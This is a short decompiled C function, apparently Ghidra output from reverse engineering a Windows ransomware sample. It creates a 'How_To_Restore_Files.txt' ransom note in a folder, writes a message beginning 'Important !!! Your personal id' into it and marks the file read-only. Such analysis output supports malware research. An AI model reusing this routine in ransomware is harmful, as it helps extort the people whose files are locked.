
void FUN_00401000(LPCWSTR param_1)

{
  int iVar1;
  DWORD DVar2;
  DWORD local_10;
  LPWSTR local_c;
  HANDLE local_8;
  
  local_c = (LPWSTR)GlobalAlloc(0x40,0x8000);
  lstrcpyW(local_c,param_1);
  iVar1 = lstrlenW(local_c);
  *(undefined *)(local_c + iVar1 + -3) = 0;
  lstrcatW(local_c,u_How_To_Restore_Files.txt_0040427d);
  DVar2 = GetFileAttributesW(local_c);
  if (DVar2 == 0xffffffff) {
    local_8 = CreateFileW(local_c,0x40000000,2,(LPSECURITY_ATTRIBUTES)0x0,2,0,(HANDLE)0x0);
    DVar2 = lstrlenA(s_Important_!!!_Your_personal_id_-_0040405a);
    WriteFile(local_8,s_Important_!!!_Your_personal_id_-_0040405a,DVar2,&local_10,(LPOVERLAPPED)0x0)
    ;
    CloseHandle(local_8);
    SetFileAttributesW(local_c,1);
  }
  GlobalFree(local_c);
  return;
}
